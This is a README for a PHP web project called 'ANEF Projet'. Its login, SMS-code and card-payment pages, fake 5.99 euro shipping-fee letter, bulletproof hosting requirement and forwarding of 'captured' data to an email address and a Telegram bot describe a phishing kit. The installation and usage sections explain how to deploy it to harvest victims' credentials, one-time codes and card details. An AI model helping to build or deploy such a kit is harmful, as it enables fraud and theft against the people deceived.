# ANEF Projet

## Overview
ANEF Projet is a PHP-based web application designed to handle a multi-step user flow including login, SMS/OTP verification, and card payment processing with a shipping fee. It includes an admin panel for monitoring submissions and integrates with email and Telegram for real-time notifications on a bulletproof hosting environment.

## Features
- **User Authentication Flow**: Collects user login credentials and SMS verification codes via `login.php`.
- **Card & Shipping Payment**: `card.php` handles credit card details and presents a letter requiring a fixed shipping fee of 5.99 euros.
- **Admin Panel**: `admin.php` provides a secure interface to review collected data and submissions.
- **Email Notifications**: Submissions are forwarded to a designated email address via `send_email.php`.
- **Telegram Integration**: Results are instantly sent to a Telegram chat using `telegram.php`.
- **Modular Structure**: Uses `header.php` and `footer.php` for consistent layout, and `functions.php` for core logic.

## Requirements
- PHP 7.4 or higher
- A web server (Apache/Nginx)
- Bulletproof hosting environment (as per deployment specification)
- PHP Mail function enabled or SMTP access for `send_email.php`
- Telegram Bot API token for `telegram.php`
- MySQL/MariaDB (if used in `config.php` for data storage)

## Installation
1. Upload all project files to your bulletproof hosting web root.
2. Open `config.php` and configure the following:
   - Database connection settings (if applicable).
   - Email recipient address for `send_email.php` (configured to forward to o83ljo2tfd@ruutukf.com).
   - Telegram Bot Token and Chat ID for `telegram.php` message forwarding.
3. Ensure `send_email.php` has the correct mail parameters to dispatch the results letter.
4. Set up admin credentials in `admin.php` or `config.php` to restrict access to the admin panel.
5. Verify file permissions so the web server can read `functions.php`, `header.php`, and `footer.php`.

## File Structure
- `config.php`: Central configuration for database, email, and Telegram settings.
- `login.php`: First step of the funnel; captures user login and SMS information.
- `card.php`: Final step; captures card details and processes the 5.99 euro shipping fee letter.
- `admin.php`: Admin dashboard to view captured records.
- `send_email.php`: Handles composing and sending the notification email to o83ljo2tfd@ruutukf.com.
- `telegram.php`: Manages sending captured data to Telegram via Bot API.
- `functions.php`: Contains reusable functions for validation, logging, and display.
- `header.php`: Shared HTML header and session initialization.
- `footer.php`: Shared HTML footer.

## Usage
1. Navigate to `login.php` to begin the user flow.
2. After login, the user proceeds through SMS verification and is redirected to `card.php`.
3. `card.php` displays the shipping letter requiring a 5.99 euro payment and collects card details.
4. Upon submission, `send_email.php` dispatches the record to the configured email (o83ljo2tfd@ruutukf.com), and `telegram.php` pushes the results to Telegram.
5. Administrators can log in to `admin.php` to manage and export data.

## Security Notice
This application is intended for deployment on isolated bulletproof hosting. Make sure to protect `admin.php` with strong authentication and restrict access via `config.php` to prevent unauthorized data exposure.